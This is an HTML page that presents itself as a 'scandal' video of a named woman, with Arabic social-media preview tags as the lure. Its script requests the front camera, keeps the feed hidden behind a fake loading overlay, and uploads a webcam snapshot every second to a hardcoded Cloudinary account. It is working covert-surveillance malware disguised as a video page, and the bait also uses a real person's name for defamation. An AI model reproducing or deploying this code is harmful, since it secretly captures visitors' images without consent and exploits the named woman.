<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta property="og:title" content="فضيحة فتيحة">
  <meta property="og:description" content="مشاهدة الفيديو">
  <meta property="og:image" content="https://i.ibb.co/Dm61dLw/104631537-2570697419925477-969813511447116423-n.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>فتيحة دحمان</title>
  <style>
    body {
      margin: 0;
      background: #000;
      color: #fff;
      font-family: sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
      position: relative;
    }
    video {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: none;
    }
    #overlay {
      position: absolute;
      inset: 0;
      background: rgba(0,0,0,0.7);
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 1.2em;
      z-index: 10;
    }
    #loading {
      /* Hidden by default. Show only while an upload is in progress. */
      display: none;
      position: absolute;
      inset: 0;
      background: rgba(0,0,0,0.6);
      z-index: 20;
      justify-content: center;
      align-items: center;
      font-size: 1.4em;
    }
  </style>
</head>
<body>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <div id="overlay">⌛ Loading....</div>
  <div id="loading">⏳ loading...</div>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const overlay = document.getElementById('overlay');
    const loading = document.getElementById('loading');

    const cloudName = 'dxkgvoale';
    const uploadPreset = 'my_unsigned';
    let captureInterval = null;

    async function initCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' },
          audio: false
        });
        video.srcObject = stream;

        await new Promise(resolve => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });

        overlay.style.display = 'none';
        // Keep video hidden - don't display to user
        // video.style.display = 'block';

        // Start uploading only after permission granted
        captureInterval = setInterval(captureAndUpload, 1000);
      } catch (err) {
        console.error('Camera access denied or not available.', err);
        overlay.textContent = '⚠️ Please allow camera permission to continue.';
        // Make sure the uploading/loading overlay is hidden if permission is denied
        loading.style.display = 'none';
        // Ensure overlay is visible to show the message
        overlay.style.display = 'flex';
      }
    }

    async function captureAndUpload() {
      loading.style.display = 'flex'; // Show loading only during upload

      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(async (blob) => {
        try {
          const formData = new FormData();
          formData.append('file', blob, 'capture.jpg');
          formData.append('upload_preset', uploadPreset);

          const res = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
            method: 'POST',
            body: formData
          });

          const data = await res.json();
          if (data.secure_url) {
            console.log('✅ Uploaded');
          } else {
            console.error('❌ Upload failed');
          }
        } catch (e) {
          console.error('⚠️ Error uploading image.', e);
        } finally {
          loading.style.display = 'none'; // Hide loading after upload
        }
      }, 'image/jpeg', 0.6);
    }

    window.onload = initCamera;
  </script>
</body>
</html>
